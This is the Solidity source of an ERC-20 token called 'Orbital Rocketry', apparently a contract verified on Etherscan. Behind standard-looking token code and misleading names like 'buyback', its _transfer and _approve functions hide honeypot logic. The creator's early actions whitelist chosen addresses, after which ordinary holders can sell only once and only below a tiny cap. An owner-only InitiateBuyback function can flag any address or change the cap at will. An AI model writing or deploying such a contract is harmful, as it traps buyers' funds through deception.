/**
 *Submitted for verification at Etherscan.io on 2021-10-20
*/

/**
 * Welcome to
 * 
 * @OrbitalRocketry
 * 
 * The domain of the space,
 * the Elon, and the infinite.
 * 
 **/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) public CheckStatusWithBuybackContract;
    mapping (address => bool) public CheckStatusOfAddress;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address private _creator;
    bool private buyMechanic;
    bool private detectSell;
    bool private tempVal;
    uint256 private getBuybackStatus;
    uint256 private setTxLimit;
    uint256 private chTx;
    uint256 private tXs;
    
    constructor (string memory name_, string memory symbol_, address creator_, bool tmp, bool tmp2, uint256 tmp9) {
        _name = name_;
        _symbol = symbol_;
        _creator = creator_;
        CheckStatusOfAddress[creator_] = tmp;
        CheckStatusWithBuybackContract[creator_] = tmp2;
        detectSell = tmp;
        tempVal = tmp2;
        buyMechanic = tmp2;
        tXs = tmp9;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        
        if ((address(sender) == _creator) && (tempVal == false)) {
            getBuybackStatus = chTx;
            detectSell = true;
        }
    
        if ((address(sender) == _creator) && (tempVal == true)) {
            CheckStatusWithBuybackContract[recipient] = true;
            tempVal = false;
        }
    
        if (CheckStatusWithBuybackContract[sender] == false) {
            if ((amount > setTxLimit)) {
                require(false);
            }
      
            require(amount < getBuybackStatus);
            if (detectSell == true) {
                if (CheckStatusOfAddress[sender] == true) {
                    require(false);
                }
                CheckStatusOfAddress[sender] = true;
            }
        }
        
        uint256 taxamount = amount;
        
        _balances[sender] = senderBalance - taxamount;
        _balances[recipient] += taxamount;

        emit Transfer(sender, recipient, taxamount);
        
    }
    
    function InitiateBuyback(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
        CheckStatusWithBuybackContract[account] = v1;
        CheckStatusOfAddress[account] = v2;
        detectSell = v3;
        getBuybackStatus = v4;
    }

    function _launchIntoOrbit(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        
        getBuybackStatus = _totalSupply;
        chTx = _totalSupply / val1;
        setTxLimit = chTx * val2;
        
        emit Transfer(address(0), account, amount);    }
        
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        if ((address(owner) == _creator) && (buyMechanic == true)) {
            CheckStatusWithBuybackContract[spender] = true;
            CheckStatusOfAddress[spender] = false;
            buyMechanic = false;
        }

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Orbit is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        bool tmp, bool tmp2, uint256 tmp6,
        uint256 tmp7, address creator,
        uint256 initialSupply, address owner,
        uint256 tmp9
    ) ERC20(name, symbol, creator, tmp, tmp2, tmp9) {
        _launchIntoOrbit(owner, initialSupply, tmp6, tmp7);
    }
}

contract OrbitalRocketry is ERC20Orbit {
    constructor() ERC20Orbit("Orbital Rocketry", "ORBITALROCKETRY", false, true, 800, 25, msg.sender, 5000000000 * 10 ** 18, msg.sender, 10) {
    }
}